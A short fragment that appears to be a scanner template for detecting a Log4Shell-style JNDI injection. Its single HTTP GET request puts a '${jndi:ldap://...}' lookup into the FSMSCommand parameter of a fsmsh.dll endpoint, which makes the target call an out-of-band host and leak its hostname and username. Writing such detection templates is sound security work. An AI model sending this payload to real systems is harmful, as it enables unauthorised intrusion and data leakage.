# Vulnerable: ITS-1546
GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}
